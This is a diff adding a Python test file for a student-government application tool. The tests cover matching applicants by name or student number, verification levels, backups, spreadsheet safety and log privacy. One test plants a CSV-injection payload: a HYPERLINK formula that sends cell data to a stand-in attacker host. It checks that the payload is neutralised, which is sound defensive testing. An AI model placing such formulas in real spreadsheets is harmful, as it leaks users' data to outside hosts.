@@ -1,0 +1,303 @@
+"""Identity, adaptive verification (name only / student number only / both), levels, backups and CSV safety."""
+import csv
+import logging
+import sqlite3
+from pathlib import Path
+
+import pytest
+
+from test_agm import HEADERS as AGM_HEADERS, students_db
+from test_sap import AP_ROW, LC_ROW, form_csv as sap_form
+from utsu_core import agm, sap, senate, verification
+from utsu_core.physical import record_physical
+from utsu_mail import campaign
+from utsu_mail.recipients import read_csv
+from utsu_std.csv_safe import SafeDictWriter, read_cell, safe_cell
+from utsu_std.database import backup_database
+from utsu_std.utils import absfile, application_uuid_for, identity_key, student_uuid_for
+
+SENATE_HEADERS = {"ts": "Timestamp", "user": "Username", "name": "Full ACORN-registered Name",
+                  "id": "Student Number", "email": "UofT Email Address", "division": "Divisional Code",
+                  "delegated": "Are you an delegated applicant?"}
+
+
+def write_rows(path, header, rows):
+    with open(path, "w", newline="", encoding="utf-8") as f:
+        writer = csv.DictWriter(f, fieldnames=header)
+        writer.writeheader()
+        writer.writerows(rows)
+    return path
+
+
+def senate_file(path, rows, with_name=True, with_id=True):
+    """A Senate export; each row is (timestamp, name, student number, email)."""
+    header = [h for k, h in SENATE_HEADERS.items()
+              if not (k == "name" and not with_name) and not (k == "id" and not with_id)]
+    out = []
+    for ts, name, number, email in rows:
+        row = {SENATE_HEADERS["ts"]: ts, SENATE_HEADERS["user"]: "p@gmail.com", SENATE_HEADERS["email"]: email,
+               SENATE_HEADERS["division"]: "UC", SENATE_HEADERS["delegated"]: "No"}
+        if with_name:
+            row[SENATE_HEADERS["name"]] = name
+        if with_id:
+            row[SENATE_HEADERS["id"]] = number
+        out.append(row)
+    return write_rows(path, header, out)
+
+
+def run_senate(path, conn, tmp_path):
+    return senate.verify_senators(path, conn.cursor(), output_dir=tmp_path / "out")
+
+
+# ---- matching -----------------------------------------------------------------------------------------------
+
+def test_decide_uses_whatever_is_given():
+    decide = verification.decide
+    assert decide("Ann Lee", "1001231617", [("u1", 3161)], [("u1", 3161)]).level == 2
+    assert decide("Ann Lee", "", [("u1", 3161)], []).level == 1
+    assert decide("", "1001231617", [], [("u1", 3161)]).method == "student number only"
+    # a wrong number never falls back to the name
+    assert decide("Ann Lee", "1009999999", [("u1", 3161)], []).reason == "student number does not match"
+    assert decide("Ann Lee", "1009999999", [], []).reason == "name not found"
+    assert decide("Sam Lee", "", [("u1", 1), ("u2", 2)], []).reason.startswith("name shared by 2")
+    assert not decide("", "", [], []).verified
+
+
+def test_match_students_with_names_only_and_numbers_only():
+    conn = students_db(("Ann", "Lee", 3161), ("Bo", "Chan", 9111), ("Di", "Park", 1111), ("Di", "Park", 2222))
+    people = [{"full_name": "ann  LEE"}, {"id": "1009991111"}, {"full_name": "Di Park"},
+              {"full_name": "Zed Zed", "id": "1000000000"}, {"id": "1000000000"}]
+    got = verification.match_students(people, conn.cursor())
+    assert [(m.uoft_uuid, m.level) for m in got] == [("u0", 1), ("u1", 1), (None, None), (None, None), (None, None)]
+    assert got[2].reason.startswith("name shared") and got[4].reason == "student number not found"
+
+
+def test_a_database_error_is_raised_not_reported_as_not_found():
+    empty = sqlite3.connect(":memory:")
+    with pytest.raises(sqlite3.OperationalError):
+        verification.match_students([{"full_name": "Ann Lee"}], empty.cursor())
+    with pytest.raises(sqlite3.OperationalError):
+        verification.bulk_check_for_students(["Ann Lee"], [3161], empty.cursor())
+
+
+def test_a_broken_lookup_table_is_an_error(tmp_path):
+    empty = tmp_path / "map.csv"
+    empty.write_text("Lookup Key, Replacement Key\n", encoding="utf-8")
+    with pytest.raises(ValueError, match="no 'form column"):
+        verification.construct_lookup_tables(empty)
+
+
+def test_trunc_id_survives_whitespace_and_blanks():
+    assert verification.trunc_of(" 1006639715 ") == 3971
+    assert verification.trunc_of("") is None and verification.trunc_of("12345") is None
+
+
+# ---- forms that lack a name or a student number -------------------------------------------------------------
+
+def test_senate_form_without_student_numbers_verifies_by_name(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161), ("Di", "Park", 1111), ("Di", "Park", 2222))
+    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "", "ann@x.ca"),
+                                            ("2026/10/01 9:05:00 a.m. AST", "Di Park", "", "di@x.ca")],
+                       with_id=False)
+    r = run_senate(form, conn, tmp_path)
+    assert [a["full_name"] for a in r["verified"]] == ["Ann Lee"]
+    assert conn.execute("SELECT verification_level, match_method FROM senate_application "
+                        "WHERE status = 'verified'").fetchall() == [(1, "name only")]
+
+
+def test_senate_form_without_names_verifies_by_student_number(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161), ("Bo", "Chan", 9111))
+    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "", "1001231617", "ann@x.ca"),
+                                            ("2026/10/01 9:05:00 a.m. AST", "", "1000000000", "q@x.ca")],
+                       with_name=False)
+    r = run_senate(form, conn, tmp_path)
+    assert [a["id"] for a in r["verified"]] == ["1001231617"] and len(r["unverified"]) == 1
+    assert conn.execute("SELECT verification_level, match_method FROM senate_application "
+                        "WHERE status = 'verified'").fetchall() == [(1, "student number only")]
+
+
+def test_a_form_with_neither_name_nor_number_is_refused(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161))
+    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "", "", "a@x.ca")],
+                       with_name=False, with_id=False)
+    with pytest.raises(ValueError, match="identify people"):
+        run_senate(form, conn, tmp_path)
+
+
+def test_sap_form_without_student_numbers_verifies_by_name(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161))
+    form = sap_form(tmp_path / "f.csv", [{**LC_ROW, "Student Number": ""}, AP_ROW])
+    r = sap.process_sap(form, conn, output_dir=tmp_path / "out")
+    assert [a["full_name"] for a in r["verified"]] == ["Ann Lee"]
+    assert r["verified"][0]["verification_level"] == 1
+
+
+def test_agm_rsvp_with_only_a_student_number(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161))
+    header = [h for h in AGM_HEADERS if "ACORN-registered" not in h] + ["Student Number"]
+    row = {"Timestamp": "2026/10/01 9:00:00 a.m. AST", "Username": "p@gmail.com", "Preferred Name": "",
+           "Preferred Pronouns": "", "UofT Email Address": "ann@mail.utoronto.ca", "Meeting Preference": "Online",
+           "Do you have any dietary restrictions or food allergies?": "", "Accessibility Requirements": "",
+           "Data Processing Confirmation": "Yes", "Contact Consent": "Yes", "Student Number": "1001231617"}
+    form = write_rows(tmp_path / "rsvp.csv", header, [row])
+    r = agm.process_agm(form, conn, output_dir=tmp_path / "out")
+    assert [x["match_method"] for x in r["verified"]] == ["student number only"]
+    assert "student_number_only_match" in r["verified"][0]["flags"]
+
+
+# ---- internal ids come from the email ----------------------------------------------------------------------
+
+def test_ids_are_built_from_the_email_and_fall_back_when_it_is_missing():
+    assert identity_key(" Ann@X.ca ", "1", "Ann") == "ann@x.ca"
+    assert identity_key("", " 100 ", "Ann") == "100" and identity_key("", "", "Ann  Lee") == "ann lee"
+    # editing the number or the name does not change the ids while the email is the same
+    assert student_uuid_for("a@x.ca", "1", "Ann") == student_uuid_for("A@x.ca", "2", "Anne")
+    ts = "2026/10/01 9:00:00 a.m. AST"
+    assert application_uuid_for("sap", ts, "a@x.ca", "1") == application_uuid_for("sap", ts, "a@x.ca", "2")
+    assert application_uuid_for("sap", ts, "a@x.ca") != application_uuid_for("agm", ts, "a@x.ca")
+    assert application_uuid_for("sap", ts, "a@x.ca") != application_uuid_for("sap", "2026/10/02 9:00:00 a.m. AST", "a@x.ca")
+
+
+def test_correcting_a_row_in_place_keeps_its_ids_and_is_verified_again(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161))
+    ts = "2026/10/01 9:00:00 a.m. AST"
+    wrong = senate_file(tmp_path / "1.csv", [(ts, "Ann Lee", "1000000000", "ann@x.ca")])
+    r1 = run_senate(wrong, conn, tmp_path)
+    assert len(r1["unverified"]) == 1
+    uuid, student = r1["unverified"][0]["uuid"], r1["unverified"][0]["student_uuid"]
+
+    fixed = senate_file(tmp_path / "2.csv", [(ts, "Ann Lee", "1001231617", "ann@x.ca")])
+    r2 = run_senate(fixed, conn, tmp_path)
+    assert (r2["verified"][0]["uuid"], r2["verified"][0]["student_uuid"]) == (uuid, student)
+    assert conn.execute("SELECT status, verification_level FROM senate_application").fetchall() == [("verified", 2)]
+
+
+def test_a_resubmission_with_the_same_email_replaces_the_older_one_even_if_the_number_changed(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161))
+    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1000000000", "ann@x.ca"),
+                                            ("2026/10/02 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca")])
+    r = run_senate(form, conn, tmp_path)
+    assert [a["verification_level"] for a in r["verified"]] == [2] and r["unverified"] == []
+    assert sorted(s for (s,) in conn.execute("SELECT status FROM senate_application")) == ["verified"]
+
+
+# ---- physical verification (level 3) -----------------------------------------------------------------------
+
+def test_physical_check_raises_level_two_to_three_and_sticks(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161), ("Bo", "Chan", 9111), ("Di", "Fox", 6000))
+    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca"),
+                                            ("2026/10/01 9:05:00 a.m. AST", "Bo Chan", "", "bo@x.ca"),
+                                            ("2026/10/01 9:10:00 a.m. AST", "Di Fox", "1000060009", "di@x.ca")])
+    run_senate(form, conn, tmp_path)
+    checked = write_rows(tmp_path / "door.csv", ["email", "checked_in"],
+                         [{"email": "ann@x.ca", "checked_in": "x"}, {"email": "bo@x.ca", "checked_in": "yes"},
+                          {"email": "di@x.ca", "checked_in": ""}, {"email": "ghost@x.ca", "checked_in": "x"}])
+    result = record_physical(conn, checked)
+    assert result["recorded"] == 1 and result["updated"] == 1 and len(result["problems"]) == 2
+    assert any("alone" in p for p in result["problems"]) and any("no verified" in p for p in result["problems"])
+    levels = dict(conn.execute("SELECT uoft_uuid, verification_level FROM senate_application"))
+    assert levels == {"u0": 3, "u1": 1, "u2": 2}
+
+    run_senate(form, conn, tmp_path)  # reprocessing never lowers it
+    assert dict(conn.execute("SELECT uoft_uuid, verification_level FROM senate_application"))["u0"] == 3
+
+
+def test_physical_check_finds_students_by_student_number_when_there_is_no_email(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161))
+    run_senate(senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1001231617", "")], ),
+               conn, tmp_path)
+    csv_path = write_rows(tmp_path / "p.csv", ["student_number"], [{"student_number": "1001231617"}])
+    assert record_physical(conn, csv_path)["recorded"] == 1
+
+
+# ---- databases from an older version -----------------------------------------------------------------------
+
+def test_older_databases_gain_the_new_columns(tmp_path):
+    conn = sqlite3.connect(":memory:")
+    conn.executescript("CREATE TABLE agm_rsvp (uuid TEXT PRIMARY KEY, student_uuid TEXT, status TEXT NOT NULL, "
+                       "reason TEXT, match_method TEXT, submission_ts TEXT, meeting_preference TEXT, "
+                       "contact_ok TEXT, flags TEXT, import_date TIMESTAMP);")
+    agm.ensure_schema(conn)
+    assert {"uoft_uuid", "verification_level"} <= {r[1] for r in conn.execute("PRAGMA table_info(agm_rsvp)")}
+
+
+# ---- backups -----------------------------------------------------------------------------------------------
+
+def make_db(path):
+    conn = sqlite3.connect(path)
+    conn.execute("CREATE TABLE t (x)")
+    conn.execute("INSERT INTO t VALUES (1)")
+    conn.commit()
+    conn.close()
+
+
+def test_backup_is_a_timestamped_consistent_copy(tmp_path):
+    db = tmp_path / "db.sqlite"
+    assert backup_database(db) is None  # nothing to back up yet
+    make_db(db)
+    first = backup_database(db)
+    second = backup_database(db)  # in the same second
+    assert first.parent == tmp_path / "backups" and first != second
+    assert first.name.startswith("db_") and first.suffix == ".sqlite"
+    assert sqlite3.connect(first).execute("SELECT x FROM t").fetchall() == [(1,)]
+
+
+def test_backups_can_be_pruned_to_the_newest(tmp_path):
+    db = tmp_path / "db.sqlite"
+    make_db(db)
+    folder = tmp_path / "backups"
+    folder.mkdir()
+    for stamp in ("20260101-000000", "20260102-000000", "20260103-000000"):
+        (folder / f"db_{stamp}.sqlite").write_bytes(b"old")
+    (folder / "other_20260101-000000.sqlite").write_bytes(b"not ours")
+    made = backup_database(db, keep=2)
+    assert sorted(p.name for p in folder.glob("db_*")) == ["db_20260103-000000.sqlite", made.name]
+    assert (folder / "other_20260101-000000.sqlite").exists()
+
+
+# ---- spreadsheet safety ------------------------------------------------------------------------------------
+
+def test_formula_cells_are_neutralised_and_plain_values_are_not():
+    assert safe_cell('=HYPERLINK("http://x")').startswith("'=")
+    assert all(safe_cell(v).startswith("'") for v in ("+cmd", "-cmd", "@SUM(1)", "\t=1", "\r=1"))
+    assert [safe_cell(v) for v in ("Ann", "-3", "+1.5", 7, None, "")] == ["Ann", "-3", "+1.5", 7, None, ""]
+    assert read_cell(safe_cell("=1+1")) == "=1+1" and read_cell("'Ann") == "'Ann"
+
+
+def test_an_applicants_formula_never_reaches_a_reviewer_sheet_as_a_formula(tmp_path):
+    conn = students_db(("Ann", "Lee", 3161))
+    evil = '=HYPERLINK("https://evil.example/?"&A1,"click")'
+    form = sap_form(tmp_path / "f.csv", [{**LC_ROW, "LC General Statement": evil}])
+    out = tmp_path / "out"
+    sap.process_sap(form, conn, output_dir=out)
+    for sheet in (out / "sap_batches").glob("batch_*.csv"):
+        for row in csv.DictReader(open(sheet, encoding="utf-8-sig")):
+            assert not row["general_statement"].startswith(("=", "+", "-", "@"))
+            assert row["general_statement"].startswith("'=")
+
+
+def test_an_email_that_starts_with_a_plus_survives_the_round_trip(tmp_path):
+    path = tmp_path / "r.csv"
+    with open(path, "w", newline="", encoding="utf-8") as f:
+        writer = SafeDictWriter(f, fieldnames=["email"])
+        writer.writeheader()
+        writer.writerow({"email": "+tag@x.ca"})
+    assert "'+tag@x.ca" in path.read_text(encoding="utf-8")
+    assert read_csv(path) == [{"email": "+tag@x.ca"}]
+
+    log = tmp_path / "log.csv"
+    campaign.append_log(log, "+tag@x.ca", "sent")
+    assert campaign.already_sent(log) == {"+tag@x.ca"}
+
+
+# ---- privacy -----------------------------------------------------------------------------------------------
+
+def test_no_student_names_are_written_to_the_log(tmp_path, caplog):
+    conn = students_db(("Ann", "Lee", 3161))
+    form = senate_file(tmp_path / "s.csv", [("2026/10/01 9:00:00 a.m. AST", "Ann Lee", "1001231617", "ann@x.ca"),
+                                            ("2026/10/01 9:05:00 a.m. AST", "Zed Nobody", "1009999999", "z@x.ca")])
+    with caplog.at_level(1):
+        run_senate(form, conn, tmp_path)
+        sap.process_sap(sap_form(tmp_path / "f.csv", [LC_ROW]), conn, output_dir=tmp_path / "out")
+    text = caplog.text
+    assert "Ann" not in text and "Nobody" not in text and "ann@" not in text and "1001231617" not in text
